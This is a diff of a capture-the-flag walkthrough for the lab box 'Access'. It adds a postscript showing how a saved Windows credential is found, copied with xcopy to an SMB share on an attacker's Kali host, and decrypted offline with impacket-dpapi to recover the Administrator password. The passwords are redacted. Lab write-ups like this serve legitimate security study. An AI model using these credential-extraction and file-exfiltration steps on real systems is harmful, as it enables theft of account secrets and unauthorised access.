@@ -96,17 +96,7 @@ $ ftp $IP
 Name: anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 230 User logged in.
-ftp> dir
-425 Cannot open data connection.
-```
-
-the login worked, but passive listing didn't. active ftp worked instead:
-
-```console
-$ curl -v --ftp-port - "ftp://$IP/"
-200 EPRT command successful
-125 Data connection already open; Transfer starting.
-226 Transfer complete.
+...
 ```
 
 ```text
@@ -350,6 +340,137 @@ C:\Users\security\Documents>type admin-desktop.txt
 Directory of C:\Users\Administrator\Desktop
 11/12/2026  12:50 AM                34 root.txt
 ```
+
+---
+
+## `05 / postscript - dpapi practice`
+
+came back to Access after completing the box to practice the DPAPI part of the walkthrough. I used `runas /savecred` for the original escalation, which was enough to get Administrator execution without recovering the password. this time I want to see how Windows actually stores that saved credential and try decrypting it offline.
+
+### finding the encrypted files
+
+Windows Credential Manager stores encrypted credential blobs under the user's profile. DPAPI uses master keys to protect them, and the master keys are protected using material derived from the user's logon secret. since I already have the `security` account creds, I can practice the other route instead of relying on `runas`.
+
+```cmd
+C:\Users\security>whoami /user
+C:\Users\security>dir /a "%APPDATA%\Microsoft\Credentials"
+C:\Users\security>dir /a "%APPDATA%\Microsoft\Protect"
+```
+
+the `security` profile had one encrypted blob under `Microsoft\Credentials`. the Protect directory contained `CREDHIST` and a folder named for the user's SID.
+
+```cmd
+C:\Users\security>dir /a "%APPDATA%\Microsoft\Credentials"
+Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials
+
+08/22/2018  09:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
+               1 File(s)            538 bytes
+
+C:\Users\security>dir /a "%APPDATA%\MICROSOFT\Protect"
+Directory of C:\Users\security\AppData\Roaming\MICROSOFT\Protect
+
+08/22/2018  09:18 PM                24 CREDHIST
+08/22/2018  09:18 PM    <DIR>          S-1-5-21-[SID_REDACTED]-1001
+```
+
+
+
+```cmd
+C:\Users\security>dir /a "%APPDATA%\Microsoft\Protect\S-1-5-21-[SID_REDACTED]-1001"
+
+08/22/2018  09:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
+08/22/2018  09:18 PM                24 Preferred
+               2 File(s)            492 bytes
+```
+
+### copying the files to Kali
+
+I used a temporary SMB share on Kali to move the encrypted credential and master key out of the Windows profile. normal `copy` initially couldn't read the files, but `xcopy /H` worked. both copied files matched the expected sizes, so I could continue with offline inspection.
+
+```cmd
+C:\Users\security>xcopy /H /Y "%APPDATA%\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290" "\\10.10.14.6\DPAPI\credential.blob"
+1 File(s) copied
+
+C:\Users\security>xcopy /H /Y "%APPDATA%\Microsoft\Protect\S-1-5-21-[SID_REDACTED]-1001\0792c32e-48a5-4fe3-8b43-d93d64590580" "\\10.10.14.6\DPAPI\masterkey.blob"
+1 File(s) copied
+```
+
+```console
+❯ ls -l dpapi/
+-rwxrwxr-x 1 kali kali 538 Aug 22  2018 credential.blob
+-rwxrwxr-x 1 kali kali 468 Aug 22  2018 masterkey.blob
+```
+
+
+### offline decryption
+
+I copied the encrypted credential file and matching master key to Kali, and used impacket to analyze them. the blob identified the master key GUID, and the `security` user's SID and password unlocked that key. with the decrypted master key, I could open the saved Administrator credential.
+
+```bash
+# Analyze the encrypted credential after copying it into private local loot
+impacket-dpapi credential -file <CREDENTIAL_BLOB>
+
+# Decrypt the matching master key with the security user's SID
+# Supply the lab account password only when required; never put it in Git
+impacket-dpapi masterkey -file <MASTERKEY_FILE> -sid <SECURITY_USER_SID>
+
+# Once the master key has actually been recovered:
+impacket-dpapi credential -file <CREDENTIAL_BLOB> -key <DECRYPTED_MASTER_KEY>
+```
+
+the credential blob referenced the same master key GUID as the file I collected. 
+
+```console
+❯ chmod 600 dpapi/*.blob
+❯ impacket-dpapi credential -file dpapi/credential.blob
+[BLOB]
+Version          : 1 (1)
+Guid MasterKey   : 0792C32E-48A5-4FE3-8B43-D93D64590580
+Description      : Enterprise Credential Data
+CryptAlgo        : 00006610 (26128) (CALG_AES_256)
+HashAlgo         : 0000800e (32782) (CALG_SHA_512)
+
+Cannot decrypt (specify -key or -sid whenever applicable)
+```
+
+the user password worked and impacket decrypted the master key using the user key.
+
+```console
+❯ impacket-dpapi masterkey -file dpapi/masterkey.blob -sid S-1-5-21-[SID_REDACTED]-1001
+[MASTERKEYFILE]
+Version     : 2 (2)
+Guid        : 0792c32e-48a5-4fe3-8b43-d93d64590580
+Flags       : 5 (5)
+MasterKeyLen: 000000b0 (176)
+BackupKeyLen: 00000090 (144)
+
+Password:
+Decrypted key with User Key (SHA1)
+Decrypted key: [REDACTED]
+```
+
+after unlocking the master key, I used it to decrypt the credential blob. impacket returned an `ACCESS\Administrator` record with the saved password. 
+
+```console
+❯ impacket-dpapi credential -file dpapi/credential.blob -key [DECRYPTED_KEY_REDACTED] > dpapi/decrypted.txt 2>&1
+
+❯ cat dpapi/decrypted.txt
+[CREDENTIAL]
+LastWritten : 2018-08-22 21:18:49+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:interactive=ACCESS\Administrator
+Username    : ACCESS\Administrator
+Unknown     : [PASSWORD REDACTED]
+```
+
+
+```fish
+# Access/loot/dpapi
+chmod 600 decrypted.txt
+```
+
 
 ---
 
